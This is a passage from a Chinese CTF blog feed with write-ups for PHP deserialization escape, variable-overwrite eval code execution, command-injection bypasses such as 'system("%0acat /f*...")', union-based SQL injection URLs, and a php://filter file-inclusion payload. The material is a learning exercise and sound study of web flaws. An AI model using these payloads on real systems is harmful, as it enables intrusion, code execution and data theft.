        <span class="hljs-keyword">$this</span>-&gt;uname=$uname;
        <span class="hljs-keyword">$this</span>-&gt;password=$password;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>
<span class="hljs-function">    </span>&#123;
            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-string">'easy'</span>)
            &#123;
                <span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);
                <span class="hljs-keyword">echo</span> $flag;    
            &#125;
            <span class="hljs-keyword">else</span>
            &#123;
                <span class="hljs-keyword">echo</span> <span class="hljs-string">'wrong password'</span>;
            &#125;
        &#125;
    &#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($string)</span></span>&#123;
    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'challenge'</span>,<span class="hljs-string">'easychallenge'</span>,$string);
&#125;

$uname=$_GET[<span class="hljs-number">1</span>];
$password=<span class="hljs-number">1</span>;
$ser=filter(serialize(<span class="hljs-keyword">new</span> a($uname,$password)));
$test=unserialize($ser);
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>这段代码的意思大致为，get方式提交一个1，之后生成一个序列化字符串并将字符串中的challenge换成easychallenge，字符长度增加4，当密码为easy时，得到flag。这题看上去与上面的例子差不多，但是构造的时候发现并不是</p>
<p>需要构造的属性</p>
<div class="hljs"><pre><code class="hljs css">";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"password"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"easy"</span>;&#125;</code></pre></div>

<p>可以发现上面的字符串长度为29，而每替换一个challenge只能逃逸出4个字符，不能构造出29，因此这里需要再构造出一个属性，使上面的字符串的长度为4的倍数。</p>
<div class="hljs"><pre><code class="hljs css">";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:"password"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"easy"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"aaaa"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"a"</span>;&#125;</code></pre></div>

<p>上面构造出的payload长度为48因此还需要12个challenge。</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $uname=<span class="hljs-string">'challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";s:4:"aaaa";s:1:"a";&#125;'</span>;
    <span class="hljs-keyword">public</span> $password=<span class="hljs-string">"1"</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($string)</span></span>&#123;
    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'challenge'</span>,<span class="hljs-string">'easychallenge'</span>,$string);
&#125;
$ser=filter(serialize(<span class="hljs-keyword">new</span> a($uname,$password)));
<span class="hljs-keyword">echo</span>($ser);
<span class="hljs-meta">?&gt;</span></code></pre></div>



<div class="hljs"><pre><code class="hljs scss">O:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">"uname"</span>;s:<span class="hljs-number">156</span>:<span class="hljs-string">"easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge"</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"easy"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"aaaa"</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;&#125;";s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">"1"</span>;&#125;

<span class="hljs-comment">//easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge  长度为156</span></code></pre></div>

<p>finalpayload：</p>
<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge</span>";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:"password"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"easy"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"aaaa"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"a"</span>;&#125;</code></pre></div>

<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>给了提示  /source查看源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

$adminPassword = <span class="hljs-string">'d8b8caf4df69a81f2815pbcb74cd73ab'</span>;
<span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">'fuxkSQL'</span>)) &#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fuxkSQL</span><span class="hljs-params">($iText)</span>    </span>
<span class="hljs-function">    </span>&#123;
        $oText = $iText;
        $oText = str_replace(<span class="hljs-string">'\\\\'</span>, <span class="hljs-string">'\\'</span>, $oText);
        $oText = str_replace(<span class="hljs-string">'\"'</span>, <span class="hljs-string">'"'</span>, $oText);
        $oText = str_replace(<span class="hljs-string">"\'"</span>, <span class="hljs-string">"'"</span>, $oText);
        $oText = str_replace(<span class="hljs-string">"'"</span>, <span class="hljs-string">"''"</span>, $oText);
        <span class="hljs-keyword">return</span> $oText;
    &#125;
&#125;
<span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">'getVars'</span>)) &#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getVars</span><span class="hljs-params">()</span></span>
<span class="hljs-function">    </span>&#123;
        $totals = array_merge($_GET, $_POST);
        <span class="hljs-keyword">if</span> (count($_GET)) &#123;
            <span class="hljs-keyword">foreach</span> ($_GET <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;
                <span class="hljs-keyword">global</span> $&#123;$key&#125;;
                <span class="hljs-keyword">if</span> (is_array($value)) &#123;
                    $temp_array = <span class="hljs-keyword">array</span>();
                    <span class="hljs-keyword">foreach</span> ($value <span class="hljs-keyword">as</span> $key2 =&gt; $value2) &#123;
                        <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">'mysql_real_escape_string'</span>)) &#123;
                            $temp_array[$key2] = fuxkSQL(trim($value2));
                        &#125; <span class="hljs-keyword">else</span> &#123;
                            $temp_array[$key2] = str_replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">'\"'</span>, str_replace(<span class="hljs-string">"'"</span>, <span class="hljs-string">"\'"</span>, (trim($value2))));
                        &#125;
                    &#125;
                    $&#123;$key&#125; = $_GET[$key] = $temp_array;
                &#125; <span class="hljs-keyword">else</span> &#123;
                    <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">'mysql_real_escape_string'</span>)) &#123;
                        $&#123;$key&#125; = fuxkSQL(trim($value));
                    &#125; <span class="hljs-keyword">else</span> &#123;
                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">'\"'</span>, str_replace(<span class="hljs-string">"'"</span>, <span class="hljs-string">"\'"</span>, (trim($value))));
                    &#125;
                &#125;
            &#125;
        &#125;
    &#125;
&#125;
getVars();
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($source)) &#123;
    highlight_file(<span class="hljs-keyword">__FILE__</span>);
&#125;
<span class="hljs-comment">//只有admin才能设置环境变量</span>
<span class="hljs-keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'you can set config variables!!'</span> . <span class="hljs-string">'&lt;/br&gt;'</span>;
    <span class="hljs-keyword">foreach</span> (array_keys($GLOBALS) <span class="hljs-keyword">as</span> $key) &#123;
        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="hljs-number">12</span>) &#123;
            @<span class="hljs-keyword">eval</span>(<span class="hljs-string">"\$$key"</span> . <span class="hljs-string">'="'</span> . $GLOBALS[$key] . <span class="hljs-string">'";'</span>);
        &#125;
    &#125;
&#125; <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">foreach</span> (array_keys($GLOBALS) <span class="hljs-keyword">as</span> $key) &#123;
        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/var\d&#123;1,2&#125;/'</span>, $key)) &#123;
            <span class="hljs-keyword">echo</span> ($GLOBALS[$key]) . <span class="hljs-string">'&lt;/br&gt;'</span>;
        &#125;
    &#125;
&#125;</code></pre></div>

<p>代码很长，但是很容易理解 </p>
<p>fuxkSQL是将可能存在sql注入的符号转义</p>
<p>getvarh是将传的参数赋值</p>
<p>global ${$key};这里存在两个$$，所以可能存在变量覆盖</p>
<p>if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) </p>
<p>$password的md5值与adminPassword,这里可以利用变量覆盖绕过</p>
<p>password=111&amp;adminPassword=md(111)</p>
<p>sha1($verif)==$verif弱类型比较，也很容易绕过</p>
<p>sha1($a)=0exxx</p>
<p>只要找出0e开头的字符串的sha1值为0e开头</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">for</span> ($i5 = <span class="hljs-number">0</span>; $i5 &lt;= <span class="hljs-number">9999999999</span>; $i5++) &#123;
    $res = <span class="hljs-string">'0e'</span> . $i5;
    <span class="hljs-comment">//0e1290633704</span>
    <span class="hljs-keyword">if</span> ($res == hash(<span class="hljs-string">'sha1'</span>, $res)) &#123;
        print_r($res);
    &#125;
&#125;</code></pre></div>

<p>所以verif=0e1290633704</p>
<p>重点在这</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (array_keys($GLOBALS) <span class="hljs-keyword">as</span> $key) &#123;
        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="hljs-number">12</span>) &#123;
            @<span class="hljs-keyword">eval</span>(<span class="hljs-string">"\$$key"</span> . <span class="hljs-string">'="'</span> . $GLOBALS[$key] . <span class="hljs-string">'";'</span>);
        &#125;
    &#125;</code></pre></div>

<ul>
<li>这段是将设置var开头，后面带1到2个数字变量的值，类似于var1=xxx或者var12=xxx 这样的</li>
<li>由于变量覆盖的环节限制了单双引号的输入，所以这里的解法为利用php复杂变量getshell</li>
</ul>
<p>什么是php复杂变量getshell</p>
<p>PHP复杂变量</p>
<p>{}不能被转移，其包裹的部分可当作变量<br>就是${phpinfo()}和{${phpinfo()}}是一样的，花括号{}只是用于区别变量边界的标识符</p>
<p>payload:</p>
<div class="hljs"><pre><code class="hljs dts">?source=<span class="hljs-number">1</span><span class="hljs-variable">&amp;</span>adminPassword=c4ca4238a0b923820dcc509a6f75849b<span class="hljs-variable">&amp;password</span>=<span class="hljs-number">1</span><span class="hljs-variable">&amp;verif</span>=<span class="hljs-number">0e1290633704</span><span class="hljs-variable">&amp;var1</span>=&#123;$_GET[<span class="hljs-number">1</span>]&#125;<span class="hljs-variable">&amp;var3</span>=$&#123;$var1()&#125;<span class="hljs-variable">&amp;1</span>=phpinfo
<span class="hljs-comment">//var1=&#123;phpinfo&#125;  </span>
<span class="hljs-comment">//var3=$&#123;$var1&#125;=$&#123;phpinfo&#125;</span></code></pre></div>

<p>flag藏在phpinfo中，ctrl+f搜素flag即可</p>
<h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-comment">// flag在flag.php</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>]))&#123;
        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/\(.*\)/'</span>, $_GET[<span class="hljs-string">'a'</span>]))
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'hacker!!!'</span>);
        ob_start(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">($data)</span></span>&#123;
                 <span class="hljs-keyword">if</span> (strpos($data, <span class="hljs-string">'flag'</span>) !== <span class="hljs-keyword">false</span>)
                 <span class="hljs-keyword">return</span> <span class="hljs-string">'ByeBye hacker'</span>;
                 <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
                 &#125;);
        <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'a'</span>]);
    &#125; <span class="hljs-keyword">else</span> &#123;
        highlight_file(<span class="hljs-keyword">__FILE__</span>);
    &#125;
    <span class="hljs-meta">?&gt;</span></code></pre></div>

<p>看下代码</p>
<blockquote>
<p>1.get 提交一个参数a</p>
<p>2.正则过滤，a中不能包含（）</p>
<p>3.function($data)，这个函数过滤了flag字段，所以行业不能包含flag</p>
<p>4.绕过上面两个后就可以执行eval()</p>
</blockquote>
<p>可以使用echo配合``绕过上面的检测</p>
<div class="hljs"><pre><code class="hljs autohotkey">echo `base64 f*`;</code></pre></div>

<p>但是一般想到的应该是</p>
<div class="hljs"><pre><code class="hljs abnf">system(<span class="hljs-string">"cat /flag.php"</span>)<span class="hljs-comment">;</span></code></pre></div>

<p>可以利用%0a绕过，%0a对应的ascii码为换行符，并且为base64格式显示，不然会被拦截</p>
<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=system(<span class="hljs-string">"%0acat /f*|%20base64"</span>)<span class="hljs-comment">;</span></code></pre></div>



]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>guestbook</title>
    <url>/2020/04/18/Guestbook/</url>
    <content><![CDATA[<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new" target="_blank" rel="noopener">guestbook</a></h1><a id="more"></a>
<p>题目提示：<strong>This guestbook sucks. sqlmap is your friend.</strong> 是sql注入<br>点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息</p>
<p>在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点<br>union 注入!<br>查看列</p>
<div class="hljs"><pre><code class="hljs perl">https:<span class="hljs-regexp">//hackme</span>.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=-<span class="hljs-number">1</span>%20union%20select%201,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%20<span class="hljs-comment">#</span>
//id=-<span class="hljs-number">1</span> 是让前面的内容不显示</code></pre></div>
<p>3被回显</p>
<p>1.查看数据库名</p>
<div class="hljs"><pre><code class="hljs perl">https:<span class="hljs-regexp">//hackme</span>.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=-<span class="hljs-number">1</span>%20union%20select%201,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>%20<span class="hljs-comment">#</span></code></pre></div>

<p>数据库的名字<code>g8</code></p>
<p>2.查看表名</p>
<div class="hljs"><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre></div>
<p>发现有一个表 <code>flag</code></p>
<p>3.测试表的字段</p>
<div class="hljs"><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">'flag'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre></div>
<p>仍然显示<code>flag</code></p>
<p>4.读取flag   </p>
<div class="hljs"><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre></div>

<p>得到flag!</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku1-10</title>
    <url>/2020/09/06/bugku1-10/</url>
    <content><![CDATA[<h1 id="bugku刷题记录1"><a href="#bugku刷题记录1" class="headerlink" title="bugku刷题记录1"></a>bugku刷题记录1</h1><a id="more"></a>



<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>查看源码即可</p>
<h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>修改前端代码</p>
<p><img src="/2020/09/06/bugku1-10/%E8%AE%A1%E7%AE%97%E5%99%A8.png" srcset="/img/loading.gif" alt></p>
<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>payload:</p>
<p><code>?what=flag</code></p>
<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><img src="/2020/09/06/bugku1-10/post.png" srcset="/img/loading.gif" alt></p>
<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>payload: <code>?num=1a</code></p>
<p>考察点：弱类型比较</p>
<blockquote>
<p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p>
<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
</blockquote>
<p>测试代码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
var_dump(<span class="hljs-string">"admin"</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span>
var_dump(<span class="hljs-string">"1admin"</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//true</span>
var_dump(<span class="hljs-string">"admin1"</span>==<span class="hljs-number">1</span>) <span class="hljs-comment">//false</span>
var_dump(<span class="hljs-string">"admin1"</span>==<span class="hljs-number">0</span>) <span class="hljs-comment">//true</span>
var_dump(<span class="hljs-string">"0e123456"</span>==<span class="hljs-string">"0e4456789"</span>); <span class="hljs-comment">//true</span>
<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//上述代码可自行测试</span></code></pre></div>

<div class="hljs"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>观察上述代码，<span class="hljs-string">"admin"</span>==<span class="hljs-number">0</span> 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是<span class="hljs-number">0</span>自然和<span class="hljs-number">0</span>相等
<span class="hljs-symbol">2 </span><span class="hljs-string">"1admin"</span>==<span class="hljs-number">1</span> 比较的时候会将<span class="hljs-number">1</span>admin转化成数值,结果为<span class="hljs-number">1</span>，而“admin1“==<span class="hljs-number">1</span> 却等于错误，也就是<span class="hljs-string">"admin1"</span>被转化成了<span class="hljs-number">0</span>,为什么呢？？
<span class="hljs-symbol">3 </span><span class="hljs-string">"0e123456"</span>==<span class="hljs-string">"0e456789"</span>相互比较的时候，会将<span class="hljs-number">0e</span>这类字符串识别为科学技术法的数字，<span class="hljs-number">0</span>的无论多少次方都是零，所以相等</code></pre></div>

<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>查看源码后，在最下面看到一串编码，为unicode编码</p>
<div class="hljs"><pre><code class="hljs c">&amp;#<span class="hljs-number">75</span>;&amp;#<span class="hljs-number">69</span>;&amp;#<span class="hljs-number">89</span>;&amp;#<span class="hljs-number">123</span>;&amp;#<span class="hljs-number">74</span>;&amp;#<span class="hljs-number">50</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">52</span>;&amp;#<span class="hljs-number">50</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">104</span>;&amp;#<span class="hljs-number">74</span>;&amp;#<span class="hljs-number">75</span>;&amp;#<span class="hljs-number">45</span>;&amp;#<span class="hljs-number">72</span>;&amp;#<span class="hljs-number">83</span>;&amp;#<span class="hljs-number">49</span>;&amp;#<span class="hljs-number">49</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">73</span>;&amp;#<span class="hljs-number">125</span>;</code></pre></div>

<p>使用工具转换为字符串</p>
<p><img src="/2020/09/06/bugku1-10/5.png" srcset="/img/loading.gif" alt></p>
<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p><strong>dns服务器用来解析域名为IP，很多国外的服务器不能访问，主要原因就是DNS服务器不能解析那些域名</strong></p>
<p><strong>hosts就是本地用来解析域名为IP</strong>  </p>
<p>因此hosts文件中有的域名记录，在本电脑浏览器中可直接使用域名访问</p>
<p>（hosts文件需要管理员权限，修改方式为使用管理员权限运行记事本后打开hosts）</p>
<p>路径为：</p>
<div class="hljs"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\e</span>tc</code></pre></div>



<p><img src="/2020/09/06/bugku1-10/host.png" srcset="/img/loading.gif" alt></p>
<p>文件保存后在浏览器中访问该域名 获得flag</p>
<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>打开页面什么也没有，源码也没有什么发现，抓包试试</p>
<p>go完也没什么反应，有点迷惑</p>
<p>但是多go几次后，发现有张图片在变</p>
<p><img src="/2020/09/06/bugku1-10/stop.png" srcset="/img/loading.gif" alt></p>
<p>多go几次就出来了flag,原理还未知</p>
<p><img src="/2020/09/06/bugku1-10/stop1.png" srcset="/img/loading.gif" alt></p>
<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"flag1.php"</span>;
highlight_file(<span class="hljs-keyword">__file__</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'args'</span>]))&#123;
  $args = $_GET[<span class="hljs-string">'args'</span>];
  <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/^\w+$/"</span>,$args))&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"args error!"</span>);
  &#125;
  <span class="hljs-keyword">eval</span>(<span class="hljs-string">"var_dump($$args);"</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<p> 首先看到要用get方式提交一个args参数，而在最后一行代码里又有var_dump(&amp;&amp;args)，于是传入args参数的值为GLOBALS,这样最后一行代码就变成了var_dump（&amp;GLOBALS），然后var_dump函数运行会输出所有变量，得出flag。 </p>
<p> <strong>Global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include或require的所有文件。</strong> </p>
<p> <strong>GLOBALS:一个包含了全部变量的全局组合数组</strong> </p>
<p>即将include”flag.php”作为全局变量在本页面输出</p>
<p>?args=GLOBALS</p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>源码中一串特别的代码直接放在浏览器的控制台中运行</p>
<p><img src="/2020/09/06/bugku1-10/web5.png" srcset="/img/loading.gif" alt></p>
<h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>打开页面什么也没有</p>
<p>扫描目录，扫出来一大堆没用的，直接抓包</p>
<p>。。。。就出来了</p>
<p><img src="/2020/09/06/bugku1-10/toudengcang.png" srcset="/img/loading.gif" alt></p>
<h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>名字提示了，网站被黑。</p>
<p>打开题目，发现鼠标动不了，可能是被黑后的后遗症</p>
<p>先扫描目录发现了<code>shell.php</code>,这可能是上次黑客留下的小马文件</p>
<p><img src="/2020/09/06/bugku1-10/hack2.png" srcset="/img/loading.gif" alt></p>
<p>打开页面，需要密码，这就需要爆破了(密码为hack)</p>
<p>确定要爆破的变量</p>
<p><img src="/2020/09/06/bugku1-10/hack3.png" srcset="/img/loading.gif" alt></p>
<p>加载密码字典</p>
<p><img src="/2020/09/06/bugku1-10/hack4.png" srcset="/img/loading.gif" alt></p>
<p>出现结果（根据length确定密码）</p>
<p><img src="/2020/09/06/bugku1-10/hack.png" srcset="/img/loading.gif" alt></p>
<p>密码为<code>hack</code></p>
<p>登录即可</p>
<h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>随便输入一个账号发现提示IP</p>
<p><img src="/2020/09/06/bugku1-10/admin1.png" srcset="/img/loading.gif" alt></p>
<p>想到了<code>X-FORWORADED-FOR:127.0.0.1</code></p>
<p>抓包试试</p>
<p>在响应包中发现一段base64编码<code>dGVzdDEyMw==</code> 解密后为test123，猜测为登录密码</p>
<p>结果真对了</p>
<p><img src="/2020/09/06/bugku1-10/admin2.png" srcset="/img/loading.gif" alt></p>
<p>当然这题也可以使用爆破的方法做，但是密码字典需要包含test123</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>查看源码发现一段js代码</p>
<p>将最后的eval改成alert(),直接在浏览器中运行弹出结果</p>
<div class="hljs"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkSubmit</span>(<span class="hljs-params"></span>)</span>&#123;
<span class="hljs-keyword">var</span> a=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"password"</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-string">"undefined"</span>!=<span class="hljs-keyword">typeof</span> a)&#123;
<span class="hljs-keyword">if</span>(<span class="hljs-string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)
<span class="hljs-keyword">return</span>!<span class="hljs-number">0</span>;
alert(<span class="hljs-string">"Error"</span>);
a.focus();
<span class="hljs-keyword">return</span>!<span class="hljs-number">1</span>&#125;
&#125;
<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"levelQuest"</span>).onsubmit=checkSubmit;</code></pre></div>

<p><img src="/2020/09/06/bugku1-10/web4.png" srcset="/img/loading.gif" alt></p>
<p><code>if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)</code></p>
<p>直接输入67d709b2b54aa2aa648cf6e87a7114f1</p>
<p><img src="/2020/09/06/bugku1-10/web41.png" srcset="/img/loading.gif" alt></p>
<h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>题目已经提示了flag的位置应该在index.php中，那么获取index.php的源码就很关键，可是查看源码什么也没有</p>
<p>注意到了url:<a href="http://123.206.87.240:8005/post/index.php?file=show.php" target="_blank" rel="noopener">http://123.206.87.240:8005/post/index.php?file=show.php</a></p>
<p>出现file这个参数，想到了文件包含的漏洞</p>
<p>用下面的payload,获取index.php，源码的base64值</p>
<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
